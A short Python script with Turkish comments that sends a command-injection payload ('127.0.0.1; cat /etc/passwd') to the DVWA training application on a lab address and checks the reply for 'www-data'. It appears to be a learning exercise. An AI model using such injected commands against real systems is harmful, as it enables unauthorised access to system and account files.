import requests
# import json
header = {"Cookie": "security=low; PHPSESSID=itejb9og3m7lo361dauqoerkdk"}
url = "http://10.0.2.15/dvwa/vulnerabilities/exec/"
data = {"ip":"127.0.0.1; cat /etc/passwd ","Submit":"Submit"}
sonuc = requests.post(url=url,data=data,headers=header)
if "www-data" in str(sonuc.content):
    print("Command inj vardır")

# Bu kod, DVWA (Damn Vulnerable Web Application) adlı bir web uygulamasındaki "Command Injection" zafiyetini öğrenmek için yazılmış bir Python programıdır.
#
# Program, "requests" adlı bir Python modülü kullanarak DVWA web uygulamasına bir POST isteği gönderir. Bu istek, "http://10.0.2.15/dvwa/vulnerabilities/exec/" adresine gönderilir.
#
# İstek verileri, "data" adlı bir sözlük içinde belirtilir. Bu sözlük, "ip" ve "Submit" anahtarlarına sahiptir. "ip" anahtarı, istismar edilmek istenen "Command Injection" zafiyetinin hedefi olan IP adresini temsil eder. Bu örnekte, IP adresi "127.0.0.1" olarak belirtilir ve ardından ";" karakteri kullanılarak bir sonraki komut satırı ifadesi olan "cat /etc/passwd" eklenir. Bu, sistemdeki kullanıcı hesaplarının listesini döndürmek için kullanılan bir Linux komutudur.
#
# "Submit" anahtarı, DVWA web uygulamasındaki "Command Injection" zafiyetini tetikleyen düğmeye tıklama işlemiyle ilgilidir.
#
# Ayrıca, istek başlıkları "header" adlı bir sözlük içinde belirtilir. Bu sözlük, "Cookie" anahtarına sahiptir ve DVWA web uygulamasına oturum açma bilgilerini (PHPSESSID) içerir.
#
# İstek gönderildikten sonra, "sonuc" adlı bir değişkene yanıt döndürülür. Bu yanıt, "content" özelliği aracılığıyla alınabilir. Eğer yanıt içeriğinde "www-data" karakter dizisi bulunuyorsa, o zaman "Command Injection" zafiyetinin var olduğu sonucuna varılır ve "Command inj vardır" mesajı yazdırılır. "www-data" karakter dizisi, Linux işletim sisteminde web sunucusu kullanıcısı için varsayılan kullanıcı adıdır. Bu, "cat /etc/passwd" komutunun çıktısında görünecektir.